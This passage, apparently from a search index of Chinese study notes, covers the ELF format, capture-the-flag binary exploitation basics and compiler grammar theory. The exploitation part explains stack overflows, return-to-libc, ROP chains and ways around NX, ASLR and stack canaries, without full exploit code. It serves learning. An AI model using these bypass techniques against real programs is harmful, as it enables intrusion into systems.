\u8868\u4e2d\u7684\u504f\u79fb\u5373\u53ef\uff0c\u800c\u65e0\u9700\u5305\u542b\u6574\u4e2a\u5b57\u7b26\u4e32\u5185\u5bb9\u3002</p> <p></p> <p>\u6211\u4eec\u4f7f\u7528 readelf -x \u8bfb\u51fa\u4e0b\u6807 30 \u533a\u7684\u8be6\u7ec6\u5185\u5bb9\u89c2\u5bdf\uff1a</p> <p></p> <p>\u7eff\u6846\u5185\u4e3a\u8be5\u533a\u5b9e\u9645\u5185\u5bb9\uff0c\u5de6\u4fa7\u4e3a\u533a\u5185\u504f\u79fb\u5730\u5740\uff0c\u540e\u4fa7\u4e3a\u5bf9\u5e94\u5185\u5bb9\u7684\u5b57\u7b26\u8868\u793a\u3002\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u91cc\u5176\u5b9e\u662f\u4e00\u5806\u5b57\u7b26\u4e32\uff0c\u8fd9\u4e9b\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5c31\u662f\u5404\u4e2a\u533a\u7684\u540d\u5b57\u3002\u56e0\u6b64 section header table \u4e2d\u6bcf\u4e2a\u5143\u7d20\u7684 Name \u5b57\u6bb5\u5176\u5b9e\u662f\u8fd9\u4e2a string table \u7684\u7d22\u5f15\u3002</p> <p>\u518d\u56de\u5934\u770b\u770b ELF header \u4e2d\u7684 e_shstrndx\uff0c\u5b83\u7684\u503c\u6b63\u597d\u5c31\u662f 30\uff0c\u6307\u5411\u4e86\u5f53\u524d\u7684 string table\u3002</p> <p>\u540c\u7406\u518d\u6765\u770b\u4e0b 29 \u533a\u7684\u5185\u5bb9\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002\u8fd9\u91cc\u6211\u4eec\u770b\u5230\u4e86\u201dmain\u201d\u5b57\u7b26\u4e32\uff0c\u8fd9\u4e9b\u662f\u6211\u4eec\u5728\u793a\u4f8b\u4e2d\u6e90\u7801\u4e2d\u5b9a\u4e49\u7684\u7b26\u53f7\uff0c\u7531\u6b64\u53ef\u4ee5 29 \u533a\u662f\u5e94\u7528\u81ea\u8eab\u7684 String Table\uff0c\u8bb0\u5f55\u4e86\u5e94\u7528\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u3002</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/ELF%20%E8%AF%A6%E8%A7%A3/#section-symtab","title":"Section: SYMTAB","text":"<p>Section Header Table \u4e2d\uff0c\u8fd8\u6709\u4e00\u7c7b SYMTAB(DYNSYM)\u533a\uff0c\u8be5\u533a\u53eb\u7b26\u53f7\u8868\u3002\u7b26\u53f7\u8868\u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\u5bf9\u5e94\u4e00\u4e2a\u7b26\u53f7\uff0c\u8bb0\u5f55\u4e86\u6bcf\u4e2a\u7b26\u53f7\u5bf9\u5e94\u7684\u5b9e\u9645\u6570\u503c\u4fe1\u606f\uff0c\u901a\u5e38\u7528\u5728\u91cd\u5b9a\u4f4d\u8fc7\u7a0b\u4e2d\u6216\u95ee\u9898\u5b9a\u4f4d\u8fc7\u7a0b\u4e2d\uff0c\u8fdb\u7a0b\u6267\u884c\u9636\u6bb5\u5e76\u4e0d\u52a0\u8f7d\u7b26\u53f7\u8868\u3002</p> <pre><code>typedef struct {\n  Elf32_Word     st_name;\n  Elf32_Addr     st_value;\n  Elf32_Word     st_size;\n  unsigned char  st_info;\n  unsigned char  st_other;\n  Elf32_Half     st_shndx;\n}Elf32_Sym;\n</code></pre> <p>\u7b26\u53f7\u8868\u4e2d\u6bcf\u4e2a\u5143\u7d20\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>name \u8868\u793a\u7b26\u53f7\u5bf9\u5e94\u7684\u6e90\u7801\u5b57\u7b26\u4e32\uff0c\u4e3a\u5bf9\u5e94 String Table \u4e2d\u7684\u7d22\u5f15\uff1b</li> <li>value \u8868\u793a\u7b26\u53f7\u5bf9\u5e94\u7684\u6570\u503c\uff1b</li> <li>size \u8868\u793a\u7b26\u53f7\u5bf9\u5e94\u6570\u503c\u7684\u7a7a\u95f4\u5360\u7528\u5927\u5c0f\uff1b</li> <li>info \u8868\u793a\u7b26\u53f7\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u5982\u7b26\u53f7\u7c7b\u578b(\u53d8\u91cf\u7b26\u53f7\u3001\u51fd\u6570\u7b26\u53f7)\uff1b</li> <li>shndx \u8868\u793a\u4e0e\u8be5\u7b26\u53f7\u76f8\u5173\u7684\u533a\u7684\u7d22\u5f15\uff0c\u4f8b\u5982\u51fd\u6570\u7b26\u53f7\u4e0e\u5bf9\u5e94\u7684\u4ee3\u7801\u533a\u76f8\u5173\u3002</li> </ul> <p>\u6211\u4eec\u7528 readelf -s \u8bfb\u51fa\u793a\u4f8b\u7a0b\u5e8f\u4e2d\u7684\u7b26\u53f7\u8868\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002\u5982\u7ea2\u6846\u4e2d\u5185\u5bb9\u6240\u793a\uff0c\u6211\u4eec\u793a\u4f8b\u7a0b\u5e8f\u5b9a\u4e49\u7684 main \u51fd\u6570\u7b26\u53f7\u7684\u7c7b\u578b\u4e3a FUNC\uff0c\u5927\u5c0f\u4e3a 35 \u5b57\u8282\uff0c\u5bf9\u5e94\u7684\u4ee3\u7801\u533a\u5728 Section Header Table \u4e2d\u7684\u7d22\u5f15\u4e3a 16</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/ELF%20%E8%AF%A6%E8%A7%A3/#_1","title":"\u53cd\u6c47\u7f16\u5b9e\u4f8b","text":"<pre><code>objdump --disassemble-all a.out\n</code></pre> <p>\u6b64\u5904\u4ec5\u5c55\u793a\u4e86 .text \u8282\u7684\u90e8\u5206\u5185\u5bb9\uff0c\u53ef\u4ee5\u770b\u5230\u5728 0x1149 \u5730\u5740 \u5904\u5b9a\u4e49\u4e86\u51fd\u6570 \uff0c\u5176\u7b26\u53f7\u4e3a main\uff0c\u8fd9\u90e8\u5206\u4fe1\u606f\u5b9e\u9645\u662f\u901a\u8fc7\u7b26\u53f7\u8868\u89e3\u6790\u800c\u6765\u7684\u3002</p> <p>\u4e2d\u95f4\u4e3a\u4e8c\u8fdb\u5236\u5f62\u5f0f\uff0c\u6700\u53f3\u4fa7\u4e3a\u5bf9\u5e94\u7684\u6c47\u7f16\u6307\u4ee4\uff0c\u4f8b\u5982 <code>0x48</code> \u5176\u5bf9\u5e94\u7684\u6c47\u7f16\u6307\u4ee4\u4e3a <code>mov</code>\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/ELF%20%E8%AF%A6%E8%A7%A3/#_2","title":"ELF \u8be6\u89e3","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/PWN_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","title":"PWN_\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/PWN_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_1","title":"\u57fa\u7840\u77e5\u8bc6\u6c47\u603b","text":"<p>PWN\uff1a\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u6316\u6398\u4e0e\u5229\u7528</p> <p>exploit\uff1a\u7528\u4e8e\u653b\u51fb\u7684\u811a\u672c\u4e0e\u65b9\u6848\uff0c\u4f8b\u5982\u8f93\u5165\u7ed9\u7a0b\u5e8f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5305\u542b\u4e00\u4e9b\u53ef\u6267\u884c\u4ee3\u7801\u7684\u5b57\u8282\u7f16\u7801\uff0c\u79f0\u4e3a\u653b\u51fb\u4ee3\u7801\uff08exploit code\uff09\u2014\u2014csapp 197\u3002\u53e6\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u5b57\u8282\u4f1a\u7528\u4e00\u4e2a\u6307\u5411\u653b\u51fb\u4ee3\u7801\u7684\u6307\u9488\u8986\u76d6\u8fd4\u56de\u5730\u5740\u3002\u90a3\u4e48\uff0c\u6267\u884c ret \u6307\u4ee4\u7684\u6548\u679c\u5c31\u662f\u8df3\u8f6c\u5230\u653b\u51fb\u4ee3\u7801\u3002</p> <p>payload\uff1a\u653b\u51fb\u8f7d\u8377\uff0c\u662f\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u6570\u636e</p> <p>shellcode\uff1a\u8c03\u7528\u653b\u51fb\u76ee\u6807\u7684 shell \u7684\u4ee3\u7801</p> <p>\u4e8c\u8fdb\u5236\u57fa\u7840\uff1a</p> <ul> <li>\u7a0b\u5e8f\u7684\u7f16\u8bd1\u4e0e\u8fde\u63a5</li> <li>linux \u4e0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f ELF</li> <li>\u8fdb\u7a0b\u865a\u62df\u5730\u5740\u7a7a\u95f4</li> <li>\u7a0b\u5e8f\u7684\u88c5\u8f7d\u4e0e\u8fdb\u7a0b\u7684\u6267\u884c</li> <li>x86 \u4e0e amd \u6c47\u7f16</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/PWN_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#pwn","title":"PWN \u57fa\u7840\u6d41\u7a0b","text":"<p>\u4e3b\u529e\u65b9\u63d0\u4f9b\uff1a\u670d\u52a1\u5668\u7684 IP \u4e0e\u7aef\u53e3\uff0c\u8be5\u7aef\u53e3\u4e0a\u6267\u884c\u4e00\u4e2a\u6709\u6f0f\u6d1e\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u8be5\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e5f\u4f1a\u63d0\u4f9b\u7ed9\u9009\u624b\u3002</p> <p>\u9009\u624b\u9700\u8981\u6784\u5efa\u4e00\u4e2a\u653b\u51fb\u811a\u672c\uff0c\u4f8b\u5982 <code>exploit.py</code>\uff0c\u8be5\u811a\u672c\u901a\u5e38\u7528\u4e8e\u6784\u5efa <code>payload</code> \uff0c\u5c06\u5176\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u89e6\u53d1\u6f0f\u6d1e\uff0c\u62ff\u5230 <code>flag</code>\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/PWN_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_2","title":"\u6808\u6ea2\u51fa","text":"<p>ELF \u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u76ee\u6807\u6587\u4ef6\u52a0\u8f7d\u8fdb\u5185\u5b58\u4e2d\u65f6\uff0c\u968f\u7740\u6307\u4ee4\u7684\u6267\u884c\uff0c\u6709\u4e9b\u6570\u636e\u4f1a\u5199\u5165\u6808\u4e2d\u3002</p> <p>\u5bf9\u4e8e\u57fa\u7840\u7684\u6808\u6ea2\u51fa\u5229\u7528\uff0c\u9700\u8981\u7406\u89e3\u6808\u5e27\u7ed3\u6784\uff0c\u4ee5\u53ca\u5e03\u5c40\u3002</p> <p>\u672c\u8d28\u4e0a\u6765\u8bf4\uff0c\u7531\u4e8e\u6808\u662f\u4ece\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\u7684\uff0c\u4f46\u662f\uff0c\u5f53\u7f16\u8bd1\u5668\u4e3a\u4e00\u4e2a\u53d8\u91cf\u5728\u6808\u4e2d\u5206\u914d\u597d\u7a7a\u95f4\u540e\uff0c\u8be5\u53d8\u91cf\u5374\u662f\u4ece\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u589e\u957f\u3002</p> <p>\u56e0\u6b64\u5f53\u8be5\u53d8\u91cf\u7684\u503c\u7684\u5927\u5c0f\u8d85\u8fc7\u5206\u914d\u597d\u7684\u7a7a\u95f4\uff0c\u5c31\u4f1a\u5bfc\u81f4\u6808\u6ea2\u51fa\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5f53\u53d8\u91cf\uff0c\u5373\u56fe\u4e2d\u7684 <code>local variables</code> \u6ea2\u51fa\u65f6\uff0c\u53ef\u4ee5\u8986\u76d6 <code>Return address</code>\u3002</p> <p></p> <p>\u2460 \u65e0\u4fdd\u62a4</p> <p>\u5728\u6ca1\u6709\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u76f4\u63a5\u81ea\u5df1\u6784\u9020 shellcode\uff0c\u7136\u540e\u4fee\u6539 <code>Return address</code> \u4f7f\u7a0b\u5e8f\u8df3\u8f6c\u81f3 shellcode \u6267\u884c\u3002</p> <p>\u5177\u4f53\u6765\u8bf4\uff0c\u5728\u6784\u9020\u8f93\u5165\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u8f93\u5165\u5305\u542b shellcode + <code>Return address</code> \uff0c\u901a\u8fc7\u586b\u5145\u9002\u5f53\u7684\u5185\u5bb9\uff0c\u4f7f\u5f97\u53d8\u91cf\u6ea2\u51fa\u540e\uff0c <code>Return address</code> \u521a\u597d\u6307\u5411 shellcode\u3002</p> <p>\u2461NX</p> <p>\u4f46\u82e5\u5b58\u5728 NX \u4fdd\u62a4\u65f6\uff0c\u4e0a\u8ff0\u65b9\u6cd5\u5c31\u5931\u6548\u4e86\uff0c\u56e0\u4e3a\u6b64\u65f6\u7684\u6808\u5c06\u53d8\u4e3a\u4e0d\u53ef\u6267\u884c\u3002</p> <p>\u867d\u7136\u6808\u4e0d\u53ef\u6267\u884c\u4e86\uff0c\u4f46\u7a0b\u5e8f\u672c\u8eab\u7684\u4ee3\u7801\u4ecd\u7136\u53ef\u4ee5\u88ab\u6267\u884c\uff0c\u4f8b\u5982 libc \u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u6240\u8c13 return to libc \u5c31\u662f\u5229\u7528 libc \u4e2d\u7684 system \u548c exit \u51fd\u6570\u83b7\u53d6 shell\u3002</p> <p>\u66f4\u8fdb\u4e00\u6b65\u7684\u8bdd\uff0c\u5c31\u8981\u7528\u5230 ROP\uff1a</p> <p>\u6240\u8c13 ROP\uff08Return Oriented Programming\uff09\uff0c\u5176\u5b9e\u5c31\u662f\u9762\u5411\u8fd4\u56de\u7f16\u7a0b\uff0c\u662f\u901a\u8fc7\u62fc\u63a5\u4ee5 ret \u6307\u4ee4\u7ed3\u5c3e\u7684\u4ee3\u7801\u7247\u6bb5\u6765\u5b9e\u73b0\u67d0\u4e9b\u529f\u80fd\u7684\u6280\u672f\u3002</p> <p>\u4ee5 ret \u6307\u4ee4\u7ed3\u5c3e\u7684\u5c0f\u7aef\u4ee3\u7801\u7247\u6bb5\u79f0\u4e3a ROP gadget\uff0c\u4f8b\u5982\uff1a</p> <pre><code>pop edx; ret;\n</code></pre> <p>\u4e3a\u4ec0\u4e48 ROP gadget \u53ef\u4ee5\u7528\u4e8e\u6784\u9020\u653b\u51fb\uff1f</p> <p>\u4e0a\u8ff0\u6307\u4ee4\u9996\u5148\u4ece\u6808\u4e2d\u5f39\u51fa\u4e00\u4e2a\u503c\uff0c\u5c06\u5176\u4fdd\u5b58\u5230 <code>%edx</code> \u5bc4\u5b58\u5668\u4e2d\uff0c\u968f\u540e ret \u6307\u4ee4\u4f1a\u518d\u6b21\u4ece\u6808\u4e2d\uff0c\u5f39\u51fa\u4e00\u4e2a\u5730\u5740\uff0c\u4f5c\u4e3a <code>%eip</code> \u7684\u503c\uff0c\u4e5f\u5c31\u662f\u4e0b\u4e00\u6761\u6267\u884c\u7684\u6307\u4ee4\u5730\u5740\u3002</p> <p>\u82e5\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u662f\u53e6\u4e00\u4e2a ROP gadget \u7684\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u901a\u8fc7\u4eba\u4e3a\u7684\u62fc\u63a5 ROP gadget\uff0c\u6784\u9020 ROP \u94fe\uff08ROP Chain\uff09\uff0c\u5c31\u53ef\u4ee5\u4eba\u4e3a\u7684\u83b7\u53d6\u9700\u8981\u7684\u6570\u636e\u3002</p> <p>\u4f8b\u5982 Return to libc \u6267\u884c system(\"/bin/sh\") \u5c31\u662f\u4e00\u4e2a\u7279\u6b8a\u7684 ROP \u94fe\u4f8b\u5b50\uff0c\u56e0\u4e3a system \u548c exit \u51fd\u6570\u672c\u8d28\u4e0a\u4e5f\u662f\u4ee5 ret \u7ed3\u5c3e\u7684\u4ee3\u7801\u7247\u6bb5\u3002</p> <p>\u5f53\u7136\uff0c\u60f3\u8981\u6784\u5efa ROP \u94fe\uff0c\u9996\u5148\u9700\u8981\u518d\u6808\u4e0a\u586b\u5145\u7528\u4e8e\u6267\u884c ROP \u94fe\u7684\u6570\u636e\uff0c\u79f0\u4e3a ROP \u8f7d\u8377\uff08ROP Payload\uff09\u3002</p> <p>\u53ef\u53c2\u8003\uff1ahttps://www.yuque.com/hxfqg9/bin/zzg02e</p> <p>\u2462ASLR/PIE</p> <p>\u56e0\u4e3a\u5730\u5740\u968f\u673a\u5316\uff0c\u4e4b\u524d\u7684\u624b\u6bb5\u5df2\u7ecf\u65e0\u6548\uff0c\u56e0\u4e3a\u65e0\u6cd5\u786e\u8ba4 gadget \u7684\u4f4d\u7f6e\u3002</p> <p>32 \u4f4d\u673a\u5668\u4e0a\u53ef\u4ee5\u901a\u8fc7 nop sled \u6765\u8fdb\u884c\u5f3a\u884c\u7206\u7834\uff0c\u4f46 64 \u4f4d\u4e0a\u5c31\u6709\u96be\u5ea6\u4e86\u3002</p> <p>\u2463Canary</p> <ul> <li>\u6cc4\u9732 Canary\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u4e0d\u540c\u51fd\u6570\u7684 Canary \u90fd\u76f8\u540c</li> <li>\u53ea\u8986\u76d6\u5c40\u90e8\u53d8\u91cf\uff0c\u4e0d\u8986\u76d6\u8fd4\u56de\u5730\u5740</li> <li>\u4fee\u6539 Thread-local Storage \u4e2d\u7684 Canary</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/PWN_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_3","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/PWN_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_4","title":"\u5806\u6ea2\u51fa","text":"<p>https://www.bilibili.com/video/BV1LJ411n7w5/?spm_id_from=333.337.search-card.all.click&amp;vd_source=61354e9e8f690736e47cbb79fe01421d</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/PWN_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#io","title":"IO","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/PWN_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_5","title":"\u6574\u6570\u6ea2\u51fa","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/","title":"\u4e2d\u79d1\u5927\u300a\u7f16\u8bd1\u539f\u7406\u300b","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_1","title":"\u7b2c\u4e8c\u7ae0 \u8bed\u8a00\u53ca\u5176\u6587\u6cd5","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#2-1","title":"2-1 \u8bcd\u6cd5\u8bed\u6cd5\u5206\u6790\u57fa\u672c\u6982\u5ff5","text":"<p>\u5b57\u6bcd\u8868 \u03a3 \u662f\u4e00\u4e2a \u6709\u7a77\u7b26\u53f7\u96c6\u5408\u3002</p> <ul> <li> <p>\u7b26\u53f7\uff1a\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u6807\u70b9\u7b26\u53f7\u3001...</p> </li> <li> <p>\u4f8b\u5982\uff1a\u4e8c\u8fdb\u5236\u5b57\u6bcd\u8868 {0,1}\u3001ASCII \u5b57\u7b26\u8868\u3001Unicode \u5b57\u7b26\u8868\u7b49\u90fd\u662f\u5b57\u6bcd\u8868</p> </li> </ul> <p>\u65e2\u7136\u5b57\u6bcd\u8868\u662f\u96c6\u5408\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u96c6\u5408\u8fd0\u7b97\u3002</p> <ul> <li>\u4e58\u79ef\uff1a{0,1}{a,b}={0a,0b,1a,1b}</li> <li>n \u6b21\u5e42\uff1a\u5373 n \u4e2a \u03a3 \u76f8\u4e58\uff0c\u5f53 n=0 \u65f6\uff0c\u4e3a\u7a7a\u96c6\u5408\uff0c\u5373{\u03b5}\uff0c\u03b5\uff08epsilon\uff09\u4e3a\u7a7a\u4e32\u7684\u610f\u601d\u3002</li> <li>\u6b63\u95ed\u5305\uff1a\u03a3 \u7684\u5404\u4e2a\u6b63\u6570\u6b21\u5e42\u7684\u5e76\u96c6\uff0c\u03a3<sup>+</sup>=\u03a3<sup>1</sup>\u222a\u03a3<sup>2</sup>\u222a\u03a3<sup>3</sup>\u222a...\u03a3<sup>n</sup></li> <li>\u514b\u6797\uff08kleen\uff09\u95ed\u5305\uff1a\u03a3<sup>*</sup>=\u03a3<sup>+</sup>\u222a\u03a3<sup>0</sup>\uff0c\u56e0\u6b64\u5b57\u6bcd\u8868\u7684\u514b\u6797\u95ed\u5305\u8868\u793a\u4efb\u610f\u5b57\u7b26\u4e32\uff08\u957f\u5ea6\u53ef\u4ee5\u4e3a\u96f6\uff09\u6784\u6210\u7684\u96c6\u5408\u3002</li> </ul> <p>\u5bf9\u4e8e\u4e0d\u540c\u7684\u8bed\u8a00\uff0c\u5b57\u6bcd\u8868 \u03a3 \u662f\u4e0d\u540c\u7684\uff0c\u5982\u679c\u7f16\u8bd1 C \u8bed\u8a00\uff0c\u5219\u5b57\u6bcd\u8868\u662f ASCII \u5b57\u7b26\u8868\uff0c\u5982\u679c\u7f16\u8bd1 Java \u8bed\u8a00\uff0c\u5219\u5b57\u6bcd\u8868\u662f Unicode \u5b57\u7b26\u8868</p> <p>\u4e32\uff1a\u8bbe \u03a3 \u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u2200x\u2208\u03a3<sup>*</sup>\uff0c\u6b64\u65f6\u79f0 x \u4e3a \u03a3 \u7684\u4e00\u4e2a\u4e32\u3002\u56e0\u6b64\u4e32\u5c31\u662f\u5b57\u6bcd\u8868\u4e2d\u7b26\u53f7\u7684\u4e00\u4e2a\u6709\u7a77\u5e8f\u5217\u3002</p> <p>\u4e32\u7684\u957f\u5ea6\uff1a\u4e32 s \u7684\u957f\u5ea6\uff0c\u901a\u5e38\u8bb0\u4f5c|s|\uff0c\u6307 s \u4e2d\u7b26\u53f7\u7684\u4e2a\u6570\uff0c\u4f8b\u5982|ab|=2\uff0c|\u03b5|=0</p> <p>\u4e32\u7684\u8fde\u63a5\uff1a\u5982\u679c x \u548c y \u662f\u4e32\uff0c\u90a3\u4e48 x \u548c y \u7684\u8fde\u63a5\u662f\u628a y \u9644\u5230 x \u7684\u540e\u9762\u800c\u5f62\u6210\u7684\u4e32\uff0c\u8bb0\u4f5c xy\u3002\u4f8b\u5982 x=house\uff0cy=dog\uff0c\u5219 xy=housedog\u3002\u7a7a\u4e32\u662f\u8fde\u63a5\u8fd0\u7b97\u7684\u5355\u4f4d\u5143\uff08identity\uff09\uff0c\u5bf9\u4e8e\u4efb\u4f55\u4e32 s \u90fd\u6709 \u03b5s=s\u03b5=s\u3002</p> <p>\u4e32\u7684\u524d\u7f00\u548c\u540e\u7f00\uff1a\u8bbe x\uff0cy\uff0cz \u662f\u4e09\u4e2a\u4e32\uff0c\u5982\u679c z=xy\uff0c\u5219 x \u662f z \u7684\u524d\u7f00\uff0cy \u662f z \u7684\u540e\u7f00\u3002</p> <p>\u4e32\u7684\u5e42\u8fd0\u7b97\uff1a\u628a\u4e32\u7684\u8fde\u63a5\u8fd0\u7b97\u770b\u505a\u4e58\u6cd5\u8fd0\u7b97\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5b9a\u4e49\u5e42\u8fd0\u7b97\u3002\u4f8b\u5982\uff0cs<sup>0</sup>=\u03b5\uff0cs<sup>1</sup>=ab\uff0cs<sup>2</sup>=abab\uff0c</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#2-2","title":"2-2 \u6587\u6cd5\u7684\u5b9a\u4e49","text":"<p>\u6587\u6cd5\u7528 G \u8868\u793a\uff0c\u5176\u5b9a\u4e49\u4e3a\u56db\u5143\u7ec4\uff1aG=(V<sub>T</sub>, V<sub>N</sub>, P, S)</p> <ul> <li>V<sub>T</sub>\uff1a\u7ec8\u7ed3\u7b26\uff08terminal symbol\uff09\u96c6\u5408\uff0c\u662f\u6587\u6cd5\u5b9a\u4e49\u7684\u8bed\u8a00\u7684\u57fa\u672c\u7b26\u53f7\uff0c\u6709\u65f6\u4e5f\u79f0\u4e3a token</li> <li>V<sub>N</sub>\uff1a\u975e\u7ec8\u7ed3\u7b26\uff08nonterminal\uff09\u96c6\u5408\uff0c\u662f\u7528\u6765\u8868\u793a \u8bed\u6cd5\u6210\u5206 \u7684\u7b26\u53f7\uff0c\u6709\u65f6\u4e5f\u79f0\u4e3a\u8bed\u6cd5\u53d8\u91cf\uff0c\u901a\u5e38\u7528&lt;&gt;\u5305\u88f9\u3002</li> </ul> <p>\u6ce8\u610f\uff1aV<sub>T</sub>\u2229V<sub>N</sub>=\u2205\uff0c\uff1aV<sub>T</sub>\u222aV<sub>N</sub>\u8868\u793a \u6587\u6cd5\u7b26\u53f7 \u96c6\uff0c\u662f\u4e00\u4e2a\u5b57\u6bcd\u8868\u3002</p> <ul> <li>P\uff1a\u4ea7\u751f\u5f0f\u96c6\u5408\uff0c\u63cf\u8ff0\u4e86\u5c06\u7ec8\u7ed3\u7b26\u548c\u975e\u7ec8\u7ed3\u7b26\u7ec4\u5408\u6210\u4e32\u7684\u65b9\u6cd5</li> <li>\u4e00\u822c\u5f62\u5f0f\uff1a\u03b1\u2192\u03b2\uff0c\u5373 \u03b1 \u5b9a\u4e49\u4e3a \u03b2</li> <li>\u03b1\u2208(V<sub>T</sub>\u222aV<sub>N</sub>)<sup>+</sup>\uff0c\u4e14 \u03b1 \u4e2d\u81f3\u5c11\u5305\u542b V<sub>N</sub>\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\uff0c\u79f0\u4e3a\u4ea7\u751f\u5f0f\u7684\u5934\u90e8\uff08head\uff09\u6216\u5de6\u90e8\uff08leftside\uff09</li> <li>\u03b2\u2208(V<sub>T</sub>\u222aV<sub>N</sub>)<sup>*</sup>\uff0c\u79f0\u4e3a\u4ea7\u751f\u5f0f\u7684\u4f53\uff08body\uff09\u6216\u53f3\u90e8\uff08rightside\uff09</li> <li>\u4ea7\u751f\u5f0f\u7684\u7b80\u5199\uff1a\u03b1\u2192\u03b2<sub>1</sub> , \u03b1\u2192\u03b2<sub>2</sub> \u53ef\u4ee5\u7b80\u5199\u4e3a \u03b1\u2192\u03b2<sub>1</sub>|\u03b2<sub>2</sub>\uff0c\u5176\u4e2d \u03b2<sub>n</sub>\u79f0\u4e3a\u5019\u9009\u5f0f\uff0c|\u8bfb\u4f5c\u6216\u3002</li> <li>S\uff1a\u5f00\u59cb\u7b26\u53f7\uff0cS\u2208V<sub>N</sub>\uff0c\u8868\u793a\u8be5\u6587\u6cd5\u4e2d\u6700\u5927\u7684 \u8bed\u6cd5\u6210\u5206\u3002</li> </ul> <p>\u6ce8\u610f\uff1a\u5728\u4e0d\u5f15\u8d77\u6b67\u4e49\u7684\u60c5\u51b5\u4e0b\u554a\uff0c\u53ef\u4ee5\u4ec5\u7528\u4ea7\u751f\u5f0f\u96c6\u5408 P \u8868\u793a\u6587\u6cd5\u3002</p> <p>\u6b64\u5916\u8fd8\u6709\u4e00\u4e9b\u7b26\u53f7\u7ea6\u5b9a\uff1a</p> <p>\u7ec8\u7ed3\u7b26\uff1a\u5b57\u6bcd\u8868\u4e2d\u6392\u5728\u524d\u9762\u7684\u5c0f\u5199\u5b57\u6bcd\uff08a, b, c, 